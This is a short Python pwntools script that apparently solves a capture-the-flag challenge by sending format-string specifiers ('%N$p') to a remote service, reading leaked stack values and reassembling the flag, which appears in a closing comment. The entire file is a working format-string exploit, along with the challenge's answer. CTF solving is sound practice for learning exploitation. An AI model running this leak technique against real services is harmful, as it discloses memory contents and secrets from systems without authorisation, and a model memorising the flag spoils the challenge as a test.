#!/usr/bin/python3

from pwn import *
lmao = b''
context.log_level = 'warn'
for i in range(500):
	try:
		io = remote('shell.actf.co' ,'21820')
		io.recv()
		io.sendline(f"%{i}$p")
		io.recvuntil("Welcome, ")
		a = (io.recvline().strip(b'\n').strip(b'0x')).decode('utf-8')
		lmao+=bytes.fromhex(a)[::-1]
		print(i, bytes.fromhex(a)[::-1])
		io.close()
		print(lmao)
	except :
		io.close()
# actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}